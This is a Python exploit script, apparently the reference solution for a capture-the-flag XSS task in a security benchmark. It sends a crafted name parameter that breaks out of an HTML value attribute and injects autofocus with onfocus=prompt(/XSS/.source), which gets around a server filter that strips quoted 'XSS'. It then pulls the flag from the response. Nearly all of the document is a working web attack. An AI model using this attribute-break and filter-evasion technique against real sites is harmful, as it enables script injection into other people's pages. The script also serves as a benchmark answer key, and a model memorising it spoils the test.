#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import re
from urllib.parse import quote

import requests

"""
X-017-24 exploit (XSS via attribute-break + autofocus/onfocus -> prompt(/XSS/.source))

Usage:
  pip install requests
  python3 benchmarks/X-017-24/exp.py [BASE_URL]

Default BASE_URL: http://ip32781

This sends a GET to /page with a crafted name that breaks out of the value
attribute and adds autofocus + onfocus=prompt(/XSS/.source). The backend
uses PhantomJS to programmatically focus elements and returns the flag when
the first dialog text equals "XSS". Using /XSS/.source avoids quoted "XSS"
which the server removes by regex.
"""

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://ip32781"


def extract_flag(text: str):
    m = re.search(r'Here is the flag:\s*([^<\r\n]+)', text, re.I)
    if m:
        return m.group(1).strip()
    m = re.search(r'FLAG\{[^}]+\}', text)
    if m:
        return m.group(0)
    return None


def main():
    payload = '" autofocus onfocus=prompt(/XSS/.source) x="'
    url = f"{BASE}/page?name={quote(payload, safe='')}"

    headers = {
        'User-Agent': 'Mozilla/5.0 (X-017-24-EXP)',
    }

    try:
        resp = requests.get(url, headers=headers, timeout=20)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        sys.exit(2)

    flag = extract_flag(resp.text)
    if flag:
        print(flag)
        sys.exit(0)

    # Fallback: print response for debugging
    print(resp.text)
    sys.exit(2)


if __name__ == "__main__":
    main()

